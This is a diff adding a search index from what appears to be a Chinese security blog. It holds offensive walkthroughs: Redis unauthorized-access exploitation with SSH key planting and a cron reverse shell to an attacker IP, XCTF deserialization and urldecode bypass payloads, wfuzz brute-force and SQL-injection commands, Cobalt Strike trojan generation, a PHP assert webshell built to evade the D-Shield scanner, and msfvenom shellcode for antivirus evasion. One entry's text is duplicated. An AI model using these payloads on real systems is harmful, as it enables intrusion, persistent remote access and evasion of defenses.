@@ -1,0 +1,58 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title><![CDATA[8/28(redis未授权,xctf)]]></title>
+    <url>%2F2019%2F08%2F28%2Fredis%2F</url>
+    <content type="text"><![CDATA[漏洞篇redis未授权访问漏洞利用环境搭建 步骤1:下载和安装 1234$ wget http://download.redis.io/releases/redis-2.8.17.tar.gz$ tar xzf redis-2.8.17.tar.gz$ cd redis-2.8.17$ make 步骤2:启动redis服务(在redis目录下运行下面命令) 123$ service iptables stop # 防止后面因为防火墙的原因连接不了redis$ cd src$ ./redis-server ../redis.conf #可以省略后面的../redis.conf,这样的话就是默认配置 启动页面如图: 攻击机也要安装redis和步骤1一样(不用做步骤2) 如果没有安装成功可以参考此文章 然后测试一下远程连接,在攻击远程目标的redis 1$ ./redis-cli -h 172.16.5.55 如图表示连接成功: 如果没有连接成功有可能是因为bind或者设置了密码设置成了127.0.0.1,可以更改配置文件 1$ vi redis.conf 可以在前面添加一个#或者把127.0.0.1改为0.0.0.0 如图: 在requirepass添加注释 如图: 漏洞利用ssh无密码连接 讲一下ssh无密码连接的思路 1.生成ssh公钥 2.把ssh公钥传入redis缓存里面 3.修改ssh公钥 4.把redis缓存修改为/root/.ssh/ 首先用nmap工具对目标进行扫描 画箭头那里Bind是0.0.0.0表示任意ip都可以连接 我们先生成一个ssh公钥 1$ ssh-keygen -t rsa 修改ssh公钥(为了防止公钥与其他数据连接在一起) 1(echo -e &quot;\n\n&quot;; cat /root/.ssh/id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; key.txt 把key.txt添加到缓冲区 1$ cat /root/key.txt | ./redis-cli -h 172.16.5.55 -x set xxx 远程连接redis然后修改配置,然后输入如下命令 1234$ ./redis-cli -h 172.16.5.55$ config set dir /root/.ssh$ config set dbfilename authorized_keys$ save 最后连接目标服务器 如果目标是存在弱密码的我们可以用hydra进行爆破先为目标设置一个密码: 1vi redis.conf 按照如下修改然后用hydra进行爆破hydra -P pass.txt redis://172.16.5.55还可以用msf进行爆破爆破成功得到密码后就可以连接了 nc反弹shell思路与上面相同更改redis存储的文件 具体命令如下先用nc监听端口远程连接redis进行配置 1234set xxx &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/172.16.5.23/666 0&gt;&amp;1\n\n&quot;config set dir /var/spool/cron/config set dbfilename rootsave 过1分钟左右就可以看到shell已经反弹过来了 xctf(web)篇php2发现什么都没有,然后有工具来了一波爆破看到了个index.phps文件,然后访问看看发现了代码泄露,通过审计发现要满足以下条件才可以拿到flag 121.$_GET[&apos;id&apos;]!==&quot;admin&quot;2.$_GET[&apos;id&apos;]===&quot;admin&quot; 这样看起来很绕,他第一次判断是否等于admin,如果等于就输出并且退出,然后中间那里有一个urldecode(),然后在判断是否大于admin如果等于的话就输出flag。所以所有的关键就在urldecode()这个函数,这个函数是用来url解码的。所以我们可以对admin进行一次urldecode然后我们只用把a变成%61然后对%61进行编码就可以绕过了(因为浏览器默认会进行一次url编码,所以我们这里还要编码一次) unserialize3题目页面:看到class类和wakeup就想到了反序列化漏洞,__wakeup会在反序列化的时候执行他里面的代码,所以要想办法绕过wakeup这里,然后wakeup有一个漏洞就是在反序列化时他的对象属性个数的值大于真实个数的属性就会跳过wakeup去执行。例如:O:4:&quot;test&quot;:1:{s:4:&quot;flag&quot;;s:4:&quot;test&quot;;}我们把1改成2他就会跳过__wakeup。因为括号里面只有1个属性,但是我们在外面说有2个属性所以他就会跳过这样题目就很简单了先对代码进行序列化得到O:4:&quot;xctf&quot;:1:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}然后把属性1变成属性2最后的payload是:O:4:&quot;xctf&quot;:2:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}然后提交得到flag 一些好的文章c2:https://github.com/platdrag/UnblockableChainshttps://iwantmore.pizza/posts/dnscat2-over-doh.htmlhttps://www.freebuf.com/sectool/210450.html 面试技巧:https://github.com/FeeiCN/SecurityInterviewQuestions ThinkPHP漏洞:https://github.com/Mochazz/ThinkPHP-Vuln/ 工具:https://www.kitploit.com/2019/08/hacktronian-all-in-one-hacking-tool-for.html?utm_source=feedburner&amp;utm_medium=feed&amp;utm_campaign=Feed%3A+PentestTools+%28PenTest+Tools%29https://www.kitploit.com/2019/08/iprotate-extension-for-burp-suite-which.html?m=1https://github.com/guimaizi/get_domain?from=timeline&amp;isappinstalled=0]]></content>
+      <categories>
+        <category>学习记录</category>
+      </categories>
+      <tags>
+        <tag>redis未授权</tag>
+        <tag>ctf</tag>
+        <tag>资源分享</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title></title>
+    <url>%2F2019%2F08%2F28%2Fwfuzz%2F</url>
+    <content type="text"><![CDATA[wfuzz工具介绍wfuzz是一个用来FUZZ的工具,他可以用来查找一个web server中的隐藏的文件和路径，来扩大攻击面。还可以进行用户爆破,sql注入测试,绕过waff等等测试 wfuzz工具基本用法常用参数 12345678910111213141516171819202122232425262728293031323334要FUZZ的参数用FUZZ表示如果有3个就要这样第一个:FUZZ第二个:FUZ2Z第三个:FUZ3Z其他更多的参数以此类推payload的个数要与FUZZ的个数相等-c: 带颜色输出-z: payloads里面的参数(wfuzz -e payloads)常用的有 file,1.txt:加载1.txt文件,用文件内容作为payload range,1-10:代表用1到10作为payload list,1-2-3:代表用1,2,3作为参数。每个参数用-分割-d: 设置POST数据-b: 设置cookie头-H: 添加http头部-p: 代理(可以使用多个代理)-X: 请求方式-R: 设置递归深度-s: 设置超时时间-t: 设置线程-e: 编码-f: 保存–follow：遵循重定向--basic: Basic Auth下面的要设置多个值的话用,分割--hc: 不输出状态码等于你设置的状态码的响应包(比如设置为200,那就不会输出状态码等于200的包)--hl: 不输出行数等于你设置的行数的响应包--hw: 不输出字数等于你设置的字数的响应包--hh: 不输出字符数等于你设置的字符数的响应包--hs: 不输出响应包中包含你输入的字符串的响应包-sc: 输出状态码等于你设置的状态码的响应包--sl: 输出行数等于你设置的行数的响应包--sw: 输出字数等于你设置的字数的响应包--sh: 输出字符数等于你设置的字符数的响应包--ss: 输出响应包中包含你输入的字符串的响应包 界面介绍id:代表编号Response: 代表返回状态码(C=404代表返回404状态码)Lines: 代表返回的行数Word: 代表返回的字数Chars: 代表返回的字符数payload: 代表发出去的payload -c参数下面是一个无-c参数的$ wfuzz -z file,dir.txt --hc 404 http://172.16.5.2/FUZZ一个有-c参数的wfuzz -c -z file,dir.txt --hc 404 http://172.16.5.2/FUZZ -z参数把文件内容当做payloadwfuzz -c -z file,dir.txt![4](https://markdown.xiaoshujiang.com/img/spinner.gif &quot;[[[1566996402195]]]&quot; ) http://172.16.5.2/FUZZ用rang来当做payloadwfuzz -c -z range,10-20 --hc 404 http://172.16.5.2/FUZZ用list来当做payloadwfuzz -c -z list,20-a-b-upload-login --hc 404 http://172.16.5.2/FUZZ -d设置POST数据wfuzz -c -z list,20-a-b-upload-login -d &quot;user=FUZZ&quot; http://172.16.5.2/ -b设置cookie设置2个cookie,其中一个是user还有一个是passwdwfuzz -c -z list,20-a-b-upload-login -d &quot;user=FUZZ&quot; -b &quot;user=test&quot; -b &quot;passwd=test&quot; http://172.16.5.2/设置多个cookie要用多个-b -X参数设置请求方法wfuzz -c -z list,GET-POST-HEAD -X FUZZ http://172.16.5.2/ -p设置代理wfuzz -c -z list,20-a-b-upload-login -p 127.0.0.1:SOCKS4,127.0.0.1:SOCKS5 http://172.16.5.2/ -t设置线程wfuzz -c -z list,20-a-b-upload-login -t 30 http://172.16.5.2/ 实用技巧爆破目录wfuzz -c -z file,dir.txt --sc 403,200,304 http://172.16.5.2/FUZZ 爆破文件wfuzz -c -z file,dir.txt --sc 200,304 http://172.16.5.2/FUZZ.php 爆破账号密码第一种爆破(一个字典对应一个字典)wfuzz -z list,a-b-c-admin -z list,1-2-3-admin -m zip -d &quot;user=FUZZ&amp;password=FUZ2Z&quot; http://172.16.5.96/login/login.php第二种爆破(一个字典中的一个值直接对应另外一个字典的所有值)wfuzz -z list,a-b-c-admin -z list,1-2-3-admin -d &quot;user=FUZZ&amp;password=FUZ2Z&quot; http://172.16.5.96/login/login.php 保存文件保存html文件wfuzz -c -z file,dir.txt -f 1,html http://172.16.5.96/FUZZ 对payload加密 wfuzz -z list,a-b-c-admin,base64 -z list,1-2-3-admin -m zip -d &quot;user=FUZZ&amp;password=FUZ2Z&quot; http://172.16.5.96/login/login.php 对cookie进行sql注入测试 wfuzz -z file,MSSQL.fuzz.txt -b &quot;sql=FUZZ&quot; http://172.16.5.96/login/login.php]]></content>
+      <tags>
+        <tag>tools</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[cobaltstrike(一)]]></title>
+    <url>%2F2019%2F08%2F25%2Fcobaltstrike(%E4%B8%80)%2F</url>
+    <content type="text"><![CDATA[工具分享链接: https://pan.baidu.com/s/1dyNrdX-MJJadb7YOWBP3Dw 提取码: 4rhw 文件树1234567891011121314151617181920212223242526272829303132333435363738394041424344├── 48643_20161201044301.zip ├── agscript 拓展应用的脚本├── c2lint 检查c2配置文件的语法和预览├── cobaltstrike - 副本.bat window客户端├── cobaltstrike.bat ├── CobaltStrikeCN.jar 汉化程序├── cobaltstrike.jar 主要程序├── cobaltstrike.store├── data│ ├── archives.bin│ ├── c2info.bin│ ├── listeners.bin│ ├── sessions.bin│ └── targets.bin├── icon.jpg├── keytool.exe├── logs│ ├── 190317│ │ ├── 169.254.245.9│ │ │ ├── beacon_1031.log│ │ │ └── beacon_90986.log│ │ ├── events.log│ │ └── weblog.log│ └── 190825│ └── events.log├── peclone├── Readme-说明.htm├── Scripts 脚本│ ├── CVE-2018-4878.cna│ ├── elevate.cna│ ├── modules│ │ ├── cve-2015-1701.x64.dll│ │ ├── cve-2015-1701.x86.dll│ │ ├── cve-2016-0051.x86.dll│ │ ├── Invoke-EventVwrBypass.ps1│ │ ├── Invoke-MS16032.ps1│ │ └── Invoke-WScriptBypassUAC.ps1│ └── ProcessTree.cna├── teamserver 启动工具的脚本├── teamserver.bat window下启动工具的脚本└── third-party 第三方工具 ├── README.vncdll.txt ├── winvnc.x64.dll 64位的vnc └── winvnc.x86.dll 32位的vnc 工具运行进入目录执行先把服务端开好命令语法:./teamserver ip地址 密码 如图: 客户端连接: 命令:java -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar开启汉化的命令是:java -Dfile.encoding=UTF-8 -javaagent:CobaltStrikeCN.jar -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar 工具分享链接: https://pan.baidu.com/s/1dyNrdX-MJJadb7YOWBP3Dw 提取码: 4rhw 文件树1234567891011121314151617181920212223242526272829303132333435363738394041424344├── 48643_20161201044301.zip ├── agscript 拓展应用的脚本├── c2lint 检查c2配置文件的语法和预览├── cobaltstrike - 副本.bat window客户端├── cobaltstrike.bat ├── CobaltStrikeCN.jar 汉化程序├── cobaltstrike.jar 主要程序├── cobaltstrike.store├── data│ ├── archives.bin│ ├── c2info.bin│ ├── listeners.bin│ ├── sessions.bin│ └── targets.bin├── icon.jpg├── keytool.exe├── logs│ ├── 190317│ │ ├── 169.254.245.9│ │ │ ├── beacon_1031.log│ │ │ └── beacon_90986.log│ │ ├── events.log│ │ └── weblog.log│ └── 190825│ └── events.log├── peclone├── Readme-说明.htm├── Scripts 脚本│ ├── CVE-2018-4878.cna│ ├── elevate.cna│ ├── modules│ │ ├── cve-2015-1701.x64.dll│ │ ├── cve-2015-1701.x86.dll│ │ ├── cve-2016-0051.x86.dll│ │ ├── Invoke-EventVwrBypass.ps1│ │ ├── Invoke-MS16032.ps1│ │ └── Invoke-WScriptBypassUAC.ps1│ └── ProcessTree.cna├── teamserver 启动工具的脚本├── teamserver.bat window下启动工具的脚本└── third-party 第三方工具 ├── README.vncdll.txt ├── winvnc.x64.dll 64位的vnc └── winvnc.x86.dll 32位的vnc 工具运行进入目录执行先把服务端开好命令语法:./teamserver ip地址 密码 如图: 客户端连接: 命令:java -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar开启汉化的命令是:java -Dfile.encoding=UTF-8 -javaagent:CobaltStrikeCN.jar -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar第一次连接的服务器会显示服务端的SSL 证书的SHA256哈希值这个直接确定就可以了 如图: 然后点击连接就可以了 里面的目录就不介绍了,如果不懂的可以看https://wbglil.gitbooks.io/cobalt-strike/content/cobalt-strikeji-ben-shi-yong/ji-ben-shi-yong-jie-shao.html 制作木马在制作木马之前先要创建一个监听器(类似msf的payload) 点击此按钮后点击add 然后进行配置 名字就是给监听器取的名字 payload反弹的方式(有beacon字符串的可以反弹到cs里面,有foreign可以用来把shell传递到其他工具) 主机:反弹到哪个ip上端口:反弹到的端口配置完成后点击save(遇到其他窗口点击确认就可以了) 如图代表添加成功: 然后制作木马 如图添加一个exe的木马 对木马进行配置, 监听器:选择自己生成监听器的名字输出:代表输出的格式然后点击Generate 运行该木马 派送一个shell给msf首先也要添加一个监听器 payload要选择foreign类型的主机填写是反弹到的ip端口填写反弹到的端口 配置完Cobalt Strike后配置msf 如图: 然后回到Cobalt Strike,右击目标选择增加会话 然后选择要派生给msf的那个监听器，在点Choose就可以了。 然后等个1分钟左右就可以看到msf收到了传递过来的shell 把msf的shell传递个Cobalt strike首先也要创建一个监听器,因为前面已经创建了一个名字为cs的监听器，所以我们这里直接使用那时候创建的那个监听器就可以了,然后我们对msf进行配置 先查看自己的session id 然后在对msf进行配置 然后就可以看到cobalt strike主机上线了]]></content>
+      <categories>
+        <category>学习记录</category>
+      </categories>
+      <tags>
+        <tag>tool</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[常量过D盾]]></title>
+    <url>%2F2019%2F08%2F03%2F%E5%B8%B8%E9%87%8F%E8%BF%87D%E7%9B%BE%2F</url>
+    <content type="text"><![CDATA[常量过D盾1234567&lt;?php sprintf("123"); sprintf("123"); sprintf("123"); $a=$_GET['a']; define("Test", "$a",true); assert(TesT);]]></content>
+      <categories>
+        <category>实战</category>
+      </categories>
+      <tags>
+        <tag>php</tag>
+        <tag>webshell</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[shellcode分离免杀]]></title>
+    <url>%2F2019%2F08%2F02%2Fshellcode%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80%2F</url>
+    <content type="text"><![CDATA[免杀原理病毒查杀一般分为:特征、行为和云查杀。这些查杀会针对PE头文件的查杀。payload文件越大的时候,越容易被查杀。 本篇文章采用特征与行为分离免杀。避免PE头文件，并且分离行为，与特征的综合免杀。 制作木马用msfvenom生成木马 msfvenom -p windows/meterpreter/reverse_https lhost=192.168.1.112 lport=4444 -e x86/shikata_ga_nai -i5 -f raw &gt; test.c 参数解释 -p:表示payload,因为用tcp的话，通信会被杀毒软件拦截通信导致反弹不了会话,所以使用https通信(因为https会加密) lhost:反弹shell的ip lport:反弹shell的端口 -e:选择编码方式 i:参数指定编码次数 -f:输出格式 下载shellcodeshellcode地址:https://github.com/clinicallyinane/shellcode_launcher/ 反弹shell设置msfconsole监听 记住payload要设置对,反正反弹的shell接收不了 然后用shell执行我们生成的木马就可以反弹shell了 查杀情况 文章声明此方法并非原创]]></content>
+      <categories>
+        <category>学习记录</category>
+      </categories>
+      <tags>
+        <tag>shellcode</tag>
+      </tags>
+  </entry>
+</search>
